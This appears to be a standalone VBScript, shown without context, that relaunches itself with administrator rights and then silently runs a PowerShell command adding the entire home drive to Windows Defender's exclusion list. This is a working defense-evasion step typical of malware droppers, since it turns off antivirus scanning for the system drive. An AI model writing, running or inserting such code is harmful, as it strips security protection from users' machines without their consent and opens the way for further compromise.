If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If
Set oShell = CreateObject("WScript.Shell")
homeDrivePath = oShell.ExpandEnvironmentStrings("%HOMEDRIVE%")

Set wshShell = WScript.CreateObject("WScript.Shell")
cmd = "powershell.exe Add-MpPreference -ExclusionPath """ & homeDrivePath & """"
wshShell.Run cmd, 0, True




